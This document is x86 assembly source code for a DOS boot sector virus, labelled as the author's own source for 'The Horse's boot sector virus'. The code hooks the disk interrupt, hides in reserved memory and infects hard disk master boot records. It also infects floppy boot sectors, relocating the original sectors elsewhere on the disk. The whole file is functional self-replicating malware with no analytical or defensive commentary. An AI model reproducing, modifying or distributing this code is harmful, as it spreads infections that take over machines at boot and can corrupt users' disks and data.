;
; The Horse's boot sector virus
;	This is an author's source
;



	.radix 16
begin:
	jmp start

my	label	word

	db	'IBM  3.3'
	dw	200
	db	2
	dw	1
	db	2
	dw	70
	dw	2d0
	db	0fdh
	dw	2
	dw	9
	dw	2
	dw	0

lee	label	word

virlen	equ	offset endcode-begin

start:
	cld
	sub	ax,ax
	mov	ds,ax
	mov	bp,7c00
	cli
	mov	ss,ax
	mov	sp,bp
	sti
	push	ax
	push	bp
	mov	ax,[413]
	push	[13*4+2]
	push	[13*4]
	pop	word ptr [old13h+7c00-100]
	pop	word ptr [old13h+7c00-100+2]
	dec	ax
	mov	[413],ax
	mov	cl,6
	shl	ax,cl
	mov	es,ax

	mov	[13*4],offset int13h-100
	mov	[13*4+2],es

	mov	cx,virlen
	sub	di,di
	mov	si,bp
	rep	movsb
	push	es
	mov	ax,offset here-begin
	push	ax
	retf
here:
	sub	ax,ax
	mov	es,ax
	int	13
	mov	ax,0201
	mov	bx,bp
	cmp	byte ptr cs:[ident-100],0fdh
	je	from_disk
	mov	cx,0007
	mov	dx,0080
	int	13
	jmp	exit

from_disk:

	mov	cx,2709
	mov	dx,0100
	int	13
	jc	exit
	push	cs
	push	cs
	pop	es
	pop	ds
	mov	ax,0201
	mov	bx,0200
	mov	cx,0001
	mov	dx,0080
	int	13
	jc	exit
	call	inf?
	je	exit
	mov	byte ptr [ident-100],0f8
	mov	ax,0301
	mov	bx,0200
	mov	cx,0007
	mov	dx,0080
	int	13
	jc	exit
	call	move
	mov	ax,0301
	sub	bx,bx
	mov	cx,0001
	int	13
exit:
	mov	byte ptr cs:[ident-100],0fdh
	retf
int13h:
	push	ds
	push	ax
	cmp	dl,1
	ja	skip
	cmp	ah,2
	jb	skip
	cmp	ah,3
	ja	skip
	sub	ax,ax
	mov	ds,ax
	mov	al,[43f]
	push	dx
	and	ax,3
	and	dx,3
	inc	dl
	test	al,dl
	pop	dx
	jne	skip
	call	infect
skip:
	pop	ax
	pop	ds
do:
	jmp	dword ptr cs:[old13h-100]

infected?:

	sub	ax,ax
	call	ojoj
	mov	ax,0201
	mov	bx,0200
	mov	cx,0001
	sub	dh,dh
	call	ojoj
inf?:
	mov	si,offset start-100
	mov	di,offset start-100+200
	mov	cx,mbyte-start
	rep	cmpsb
return:
	ret
infect:
	push	bx
	push	cx
	push	dx
	push	si
	push	di
	push	es
	push	cs
	push	cs
	pop	es
	pop	ds
	cld
	call	infected?
	je	leave
	mov	ax,0301
	mov	bx,0200
	mov	cx,2709
	mov	dh,1
	call	ojoj
	jc	leave
	call	move
	mov	ax,0301
	sub	bx,bx
	mov	cx,0001
	sub	dh,dh
	call	ojoj
leave:
	pop	es
	pop	di
	pop	si
	pop	dx
	pop	cx
	pop	bx
	ret

ojoj:
	pushf
	push	cs
	call	do
	ret
move:
	mov	di,offset my-100
	mov	si,offset my-100+200
	mov	cx,lee-my
	rep	movsb
	mov	di,offset usm-100
	mov	si,offset usm-100+200
	mov	cx,endcode-usm
	rep	movsb
	ret


mbyte	 label word

old13h		dd	?
ident		db	0fdh

usm	label	word

db	135d	dup (?)

db	55,0AA

endcode label word

